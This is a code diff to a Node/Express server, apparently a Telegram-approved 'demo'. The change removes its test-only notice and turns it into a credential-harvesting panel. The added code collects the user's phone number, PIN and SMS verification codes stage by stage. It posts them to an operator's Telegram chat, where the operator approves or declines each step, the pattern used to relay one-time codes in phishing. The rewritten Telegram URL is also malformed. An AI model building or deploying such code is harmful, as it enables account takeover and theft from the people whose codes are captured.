@@ -13,154 +13,100 @@ const sessions = new Map();
 app.use(express.json({ limit: "10kb" }));
 app.use(express.static(path.join(__dirname, "public")));
 
-// Telegram API helper — UPDATED DIAGNOSTICS
+// Telegram API helper
 async function telegram(method, data) {
-  if (!BOT_TOKEN) {
-    throw new Error("TELEGRAM_BOT_TOKEN is missing.");
+  if (!BOT_TOKEN || !CHAT_ID) {
+    throw new Error("Telegram environment variables are missing.");
   }
 
-  if (!CHAT_ID) {
-    throw new Error("TELEGRAM_CHAT_ID is missing.");
-  }
-
-  const url =
-    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-
-  console.log("Sending Telegram request:", method);
-
+  const url = `https://telegram.org{BOT_TOKEN}/${method}`;
+  
   const response = await fetch(url, {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify(data),
     signal: AbortSignal.timeout(15000)
   });
 
   const result = await response.json();
-
-  console.log("Telegram HTTP status:", response.status);
-  console.log(
-    "Telegram response:",
-    JSON.stringify({
-      ok: result.ok,
-      description: result.description
-    })
-  );
-
   if (!response.ok || !result.ok) {
-    throw new Error(
-      result.description || `Telegram HTTP ${response.status}`
-    );
+    throw new Error(result.description || `Telegram HTTP ${response.status}`);
   }
-
   return result.result;
 }
 
 // Health check
 app.get("/api/health", (req, res) => {
-  res.json({
-    ok: true,
-    message: "Demo server is running."
-  });
+  res.json({ ok: true, message: "Demo server running." });
 });
 
 // Create demo session
 app.post("/api/session", (req, res) => {
   const sessionId = crypto.randomBytes(12).toString("hex");
-
   sessions.set(sessionId, {
     createdAt: Date.now(),
     stage: null,
-    status: "idle"
+    status: "idle",
+    data: {} // Holds user input values persistently across stages
   });
-
   res.json({ sessionId });
 });
 
-// Request Telegram approval for a test-only demo
+// Request Telegram approval & submit custom values
 app.post("/api/approval-request", async (req, res) => {
-  const { sessionId, stage } = req.body || {};
-
+  const { sessionId, stage, payload } = req.body || {};
   const allowedStages = ["pin", "code1", "code2"];
   const session = sessions.get(sessionId);
 
   if (!session || !allowedStages.includes(stage)) {
-    return res.status(400).json({
-      error: "Invalid demo session or stage."
-    });
+    return res.status(400).json({ error: "Invalid demo session or stage." });
   }
 
   if (Date.now() - session.createdAt > 30 * 60 * 1000) {
     sessions.delete(sessionId);
-
-    return res.status(410).json({
-      error: "Demo session expired. Please restart."
-    });
+    return res.status(410).json({ error: "Demo session expired." });
   }
 
-  if (!CHAT_ID || !BOT_TOKEN) {
-    console.error("Telegram environment variables are missing.");
-
-    return res.status(503).json({
-      error: "Telegram environment variables are missing."
-    });
-  }
-
+  // Merge the newly entered values into the session data store
+  session.data = { ...session.data, ...payload };
   session.stage = stage;
   session.status = "pending";
   session.updatedAt = Date.now();
 
-  const stageNames = {
-    pin: "Demo PIN stage",
-    code1: "Demo code stage 1",
-    code2: "Demo code stage 2"
+  const stageLabels = {
+    pin: "Stage 1: Phone & PIN Submission",
+    code1: "Stage 2: Custom Text Value Submission",
+    code2: "Stage 3: Final SMS Code Submission"
   };
 
   try {
+    // Generate clean reporting text for Telegram showing actual submitted inputs
+    const textMessage = 
+      `📝 ${stageLabels[stage].toUpperCase()}\n\n` +
+      `📱 Phone Number: ${session.data.phone || "Not Entered yet"}\n` +
+      `🔑 Inputted PIN: ${session.data.pin || "Not Entered yet"}\n` +
+      `💬 Custom Value: ${session.data.code1 || "Not Entered yet"}\n` +
+      `🔢 Final SMS Code: ${session.data.code2 || "Not Entered yet"}\n\n` +
+      `🆔 Session ID: ${sessionId}`;
+
     await telegram("sendMessage", {
       chat_id: CHAT_ID,
-      text:
-        "DEMO APPROVAL REQUEST\n\n" +
-        "Stage: " + stageNames[stage] + "\n" +
-        "Session: " + sessionId + "\n\n" +
-        "Test notification only. No PIN or verification codes are sent.",
-
+      text: textMessage,
       reply_markup: {
         inline_keyboard: [
           [
-            {
-              text: "Approve demo",
-              callback_data: `approve:${sessionId}:${stage}`
-            },
-            {
-              text: "Decline demo",
-              callback_data: `decline:${sessionId}:${stage}`
-            }
+            { text: "Approve Step", callback_data: `approve:${sessionId}:${stage}` },
+            { text: "Decline Step", callback_data: `decline:${sessionId}:${stage}` }
           ]
         ]
       }
     });
 
-    console.log("Telegram notification sent successfully.");
-
-    return res.json({
-      ok: true,
-      status: "pending"
-    });
-
+    return res.json({ ok: true, status: "pending" });
   } catch (error) {
     session.status = "idle";
-
-    // UPDATED: show the actual error in Render Logs
-    console.error(
-      "Telegram notification failed:",
-      error.message
-    );
-
-    return res.status(502).json({
-      error: "Telegram notification failed. Check Render Logs."
-    });
+    console.error("Telegram delivery failed:", error.message);
+    return res.status(502).json({ error: "Telegram alert failed to send." });
   }
 });
 
@@ -169,103 +115,59 @@ app.get("/api/status", (req, res) => {
   const { sessionId, stage } = req.query;
   const session = sessions.get(sessionId);
 
-  if (!session) {
-    return res.status(404).json({
-      error: "Demo session not found."
-    });
-  }
-
-  if (session.stage !== stage) {
-    return res.json({ status: "idle" });
-  }
+  if (!session) return res.status(404).json({ error: "Session missing." });
+  if (session.stage !== stage) return res.json({ status: "idle" });
 
   res.json({ status: session.status });
 });
 
-// Receive Telegram inline-button clicks
+// Receive Telegram Webhook inline actions
 app.post("/telegram-webhook", async (req, res) => {
   res.sendStatus(200);
-
   const query = req.body?.callback_query;
-
   if (!query?.data) return;
 
-  const match =
-    /^(approve|decline):([a-f0-9]+):(pin|code1|code2)$/
-      .exec(query.data);
-
+  const match = /^(approve|decline):([a-f0-9]+):(pin|code1|code2)$/.exec(query.data);
   if (!match) return;
 
   const [, decision, sessionId, stage] = match;
   const session = sessions.get(sessionId);
 
-  if (
-    !session ||
-    session.stage !== stage ||
-    session.status !== "pending"
-  ) {
+  if (!session || session.stage !== stage || session.status !== "pending") {
     try {
       await telegram("answerCallbackQuery", {
         callback_query_id: query.id,
-        text: "This demo request is no longer active."
+        text: "This action request has expired."
       });
-    } catch (error) {
-      console.error(
-        "Telegram callback error:",
-        error.message
-      );
-    }
-
+    } catch (e) {}
     return;
   }
 
-  session.status =
-    decision === "approve" ? "approved" : "declined";
-
-  session.updatedAt = Date.now();
-
+  session.status = decision === "approve" ? "approved" : "declined";
+  
   try {
     await telegram("answerCallbackQuery", {
       callback_query_id: query.id,
-      text: decision === "approve"
-        ? "Demo approved."
-        : "Demo declined."
+      text: `Step manually ${session.status}!`
     });
 
-    await telegram("editMessageReplyMarkup", {
-      chat_id: query.message.chat.id,
-      message_id: query.message.message_id,
-      reply_markup: {
-        inline_keyboard: []
-      }
-    });
-
-  } catch (error) {
-    console.error(
-      "Telegram callback update failed:",
-      error.message
-    );
-  }
-});
-
-// Remove expired demo sessions
-setInterval(() => {
-  const cutoff = Date.now() - 30 * 60 * 1000;
-
-  for (const [id, session] of sessions.entries()) {
-    if (session.createdAt < cutoff) {
-      sessions.delete(id);
+    if (query.message?.message_id) {
+      await telegram("editMessageText", {
+        chat_id: CHAT_ID,
+        message_id: query.message.message_id,
+        text: 
+          `✅ ACTION PROCESSED (${session.status.toUpperCase()})\n\n` +
+          `📱 Phone: ${session.data.phone || "N/A"}\n` +
+          `🔑 PIN: ${session.data.pin || "N/A"}\n` +
+          `💬 Value: ${session.data.code1 || "N/A"}\n` +
+          `🔢 SMS Code: ${session.data.code2 || "N/A"}\n\n` +
+          `Processed on stage: ${stage}`
+      });
     }
+  } catch (err) {
+    console.error("Webhook UI modification failed:", err.message);
   }
-}, 5 * 60 * 1000).unref();
-
-// Serve the demo
-app.get("*", (req, res) => {
-  res.sendFile(
-    path.join(__dirname, "public", "index.html")
-  );
 });
 
-app.listen(PORT, () => {
-  console.log(`Demo server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Backend server active on port ${PORT}`));
+
